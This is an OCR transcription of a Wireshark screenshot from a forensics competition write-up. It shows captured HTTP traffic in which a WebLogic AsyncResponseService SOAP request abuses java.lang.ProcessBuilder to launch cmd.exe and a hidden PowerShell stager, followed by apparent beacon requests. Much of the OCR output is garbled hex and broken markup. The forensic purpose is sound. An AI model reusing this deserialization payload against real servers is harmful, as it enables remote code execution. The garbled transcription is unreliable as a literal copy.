@@ -1,0 +1,165 @@
+# OCR: a573a9ea4f45d494547d025915f76ae4.webp
+# 来源: ./02-WriteUp/2025/2025-数证杯-决赛团队赛/a573a9ea4f45d494547d025915f76ae4.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:28
+
+流量1.pcap 文件(E）
+编辑(E)
+4 http No
+视图M Time
+跳转(G) 区
+15718 363.867968 15721 363.970486 15735 371.639219 15876371.754899 15894 374.389010 15896 374.395396 15897 374.396073 15898 374.397437 15980374.400371 15902374.402823 15983 374.403295 15984 374.405354 15985 374.405968 15906374.409195 15000274410014
+<soapenv:Header>
+<wsa:Action>
+捕获(C) Q
+Source
+分析(A)统计(S)电话M)无线(W)工具(T)帮助(H)
+0
+192.168.111.128 192.168.111.88 192.168.111.88 192.168.111.128 192.168.111.89 192.168.111.128 192.168.111.80 192.168.111.128 192.168.111.86 192.168.111.128 192.168.111.88 192.168.111.128 192.168.111.88 192.168.111.128 102.150.11186
+5eqJo5ukQF1jIAtowN7G </wsa:Action>
+<wsa:RelatesTo>
+JUAbTug80guNvtUrQe89
+</wsa:RelatesTo> <wonk:wonkContext
+8出品
+??
+Destination
+192.168.111.86 192.168.111.128 192.168.111.128 192.168.111.80 192.168.111.128 192.168.111.80 192.168.111.128 192.168.111.80 192.168.111.128 192.168.111.86 192.168.111.128 192.168.111.88 192.168.111.128 192.168.111.80
+xmlns:work="http://bea.com/28e4/e6/soap/workarea/"> <void
+class-"java.lang.ProcessBuilder"> <array
+class="java.lang.String"
+length="3"> <void
+index="e"> <string>
+cmd.exe </string>
+</void> <void
+index="i"> <string>/c
+</stringx
+</void> <void
+indov_"g", <string>
+Protocol HTTP/XML
+HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP HTTP
+FORENSIX.CN 网
+[-] powershell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4)(sb='powershell.exe')el:
+</string> </void>
+</array> <void
+ENS
+method-"start"/> </void>
+</work:WorkContext>
+</soapenv:Header> Tag (xml.tag),5,046byte(s)
+LengttInfo
+1292POsT/_async/AsyncResponseServiceHTTP/1.1 182HTTP/1.1 202Accepted
+338GET/g5N6R8w5IHFY91n3MAaN5AWzF6zndcysRLN5Re4RLSsT-9HTTP/1.1 1061HTTP/1.1200OK
+382GET/g5N6R8w5IHFY91n3MAaN7AhHkCImcWuA-nAI-Ae4WjfGQ9w-DdPon3nLfGXTg5NS5QsVwFF/HTTP/1.1 561HTTP/1.1200OK
+382GET/g5N6R8w5IHFY91n3MAaN7AhHkCImcWuA-nAI-Ae4WjfGQ9w-DdPon3nLfGXTg5NS5QsVwFF/HTTP/1.1 172HTTP/1.1200OK
+451POST/g5N6R8w5IHFY91n3MAaN7AhHkCImcWuA-nAI-A4WjfGQ9w-DdPon3nLfGXTg5NS5QsvwFF/HTTP/1.1 172HTTP/1.1200QK
+382GET/g5N6R8w5IHFY91n3MAaN7AhHkCImcWuA-nAI-Ae4WjfGQ9w-DdPon3nLfGXTg5NS5QsVwFF/HTTP/1.1 302HTTP/1.1200OK
+382GET/g5N6R8w5IHFY91n3MAaN7AhHkCImcWuA-nAI-Ae4WjfGQ9w-DdPon3nLfGXTg5NS5QsVwFF/HTTP/1.1 172HTTP/1.1208OK
+LOOPOcT/-ENCDO-ETHEVoTnaMAN7Ahk
+eebe eece ee eeee eefe eiee?118 12e 8138@148 e15e 9160 6178 6188 2198 lae eibe@1ce eide elee 1fe 6200 e21e e22e 6230 8240 e25e 268 8270 8288 e298 e2ae e2be e2ce 82de e2e6 e2fe e300 6316
+69636522
+3e
+616465
+72
+3e 36 6e 3e 72 65 6f 66 60 6f 63 2e 3e 61 26 64 69 69 29 6e 76 3 65 26 29 3a 3d 27 69 50 6e 6c 4+ 61 73 6
+35 77 3e 4a
+73 Fe 3d
+72 56 3C 76
+26 e e 69
+22 72 20 20 3a 27 Z Fe 57 EC
+7 53 65
+65 Ae 36
+74 22
+6h 61 67
+69 6a 74 4e
+71 37
+65 61
+3-3e
+58 Sn
+69 65 61 61
+6d65 75
+be
+Packet (1292 bytes)
+3e de
+63 60 74
+3c736f
+73
+3C 6f 3
+S 55
+77
+35 49 30
+75 6 2e 64
+DE 24
+73
+3d
+27
+79656e763a4865 61
+6f
+61 6h
+69 65
+2d
+3a 51 61
+69 64
+41 46
+74
+69 40
+76 41
+41 69 54
+51 6b 5+ 53 2
+e 72
+6 74 6+ 6f 5 74 43 72 6
+26 67 2
+22
+6
+67 74 69 72
+6+ be
+24 78
+3F 68 68
+46
+22 69 72 72 64 69 2+
+77 76 69 50 62 65
+65 65 29
+69
+72
+67
+262d6e 69
+ReassembledTCP(5570bytes)
+ice"><so apenv:He ader><ws
+a:Action
+>5eqJo5ukQF1jIAt ewN7G</wsaActio n><wsa:R elatesTo >JUAbTug 80guNvtu rQe89</w
+sa:Relat
+esTo><wo
+rk:workc
+ontext x mlns:wor
+//bea.co
+k="http:
+m/2004/e6/soap/w orkarea/
+"><void
+class-"j
+ava.lang
+.Process Builder'
+><array ava.lang length= index= ing>cmd.
+class="+.String"3"><voi"e"><str exe</str
+id><void
+ing></vo
+index"
+1"><stri
+ng>/cs/string><i void><vo id index-"2"><st
+ring>pow
+ershell.
+exe -nop
+-w hidd en -noni-c"if(
+[IntPtr
+::size-
+eg4)(sb
+-'powers hell.exe lelsefsb=Senv:w
+indir+
+syswow64
+windows
+PowerShe
+111v1.ypowershe 1l.exe'
+;$s=New-
+Object s ystem.Di agnostic s.Proces sStartIn fo;$s.Fi leName=s b;Ss.Arg
+uments=
+-noni-n
+DecodedUTF-8text(5297bvtes)
+NSIX.CN
+分组：456428-Displayed:95162(20.8%)
